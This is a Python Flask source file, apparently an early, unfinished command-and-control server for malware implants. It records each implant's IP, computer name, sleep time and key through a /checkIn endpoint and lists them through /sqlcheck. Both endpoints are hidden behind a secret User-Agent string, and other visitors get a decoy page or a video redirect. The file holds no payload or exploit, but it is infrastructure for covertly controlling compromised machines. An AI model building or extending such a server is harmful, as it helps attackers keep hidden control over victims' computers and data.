from flask import Flask, render_template, request, url_for, redirect, jsonify
import click
from flask.cli import AppGroup
from datetime import datetime
import os
import sqlite3
import requests
import random
import string

if os.path.exists('./data/real.db'):
    pass
else:
    os.mknod("./database/real.db")

app = Flask(__name__)

dbpath = "sqlite:///data/real.db"
# sqlite3 database/c2.db < schema.sql

# connection = sqlite3.connect("./data/real.db")
# cursor = connection.cursor()


def makeId(length=10):
    return (''.join(random.choice(string.ascii_lowercase) for i in range(length))).upper()


def addImplant(data):
    connection = sqlite3.connect("./data/real.db")
    cursor = connection.cursor()
    results = [x for x in cursor.execute(
        "SELECT id FROM Implants WHERE agentId=?", [(data["agentId"])])]
    if len(results) == 0:
        parsedData = [data["authorize_code"], makeId(), str(
            datetime.today()), data["IP"], data["sleepTime"], data["guido"], data["computerName"], data["DHkey"]]

        cursor.execute('INSERT INTO Implants (authorize_code, agentId, checkTime, IP, sleepTime, guido, computerName, DHkey)\
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)', parsedData)
        connection.commit()

    elif (len(results) == 1):
        print("I lowkey don't know what we change everytime we checkIn after the first time, so this text is a placeholder")

        # parsedData = [data["authorize_code"], makeId(), str(
        #     datetime.today()), data["IP"], data["sleepTime"], data["guido"], data["computerName"], data["DHkey"]]

        # cursor.execute('INSERT INTO Implants (authorize_code, agentId, checkTime, IP, sleepTime, guido, computerName, DHkey)\
        #                 VALUES (?, ?, 34, ?, ?, ?, ?, ?)', parsedData)
        # connection.commit()
    else:
        print("Error, Implant already recorded at indexes:", results)

    connection.close()


@ app.route("/sqlcheck")
def seeTable():
    print(request.headers["User-Agent"])
    if (request.headers["User-Agent"]) == "IWasBornInTheUSA":
        connection = sqlite3.connect("./data/real.db")
        cursor = connection.cursor()
        ans = []
        for row in cursor.execute("select * from Implants"):
            ans.append(row)
        connection.close()
        return jsonify(data=ans)
    else:
        return render_template("wrongTurn.html")


@ app.route("/")
def index():
    return redirect("https://www.youtube.com/watch?v=Pv0CA1rjGfg")


@ app.route("/checkIn", methods=['POST'])
def check():
    print(request.headers["User-Agent"])
    if (request.headers["User-Agent"]) == "IWasBornInTheUSA":
        # raw data function d = request.get_data()
        data = request.get_json()

        addImplant(data)
        return data
    else:
        return render_template("wrongTurn.html")
        # return redirect("https://www.youtube.com/watch?v=Pv0CA1rjGfg")


if __name__ == "__main__":
    app.run(debug=True)
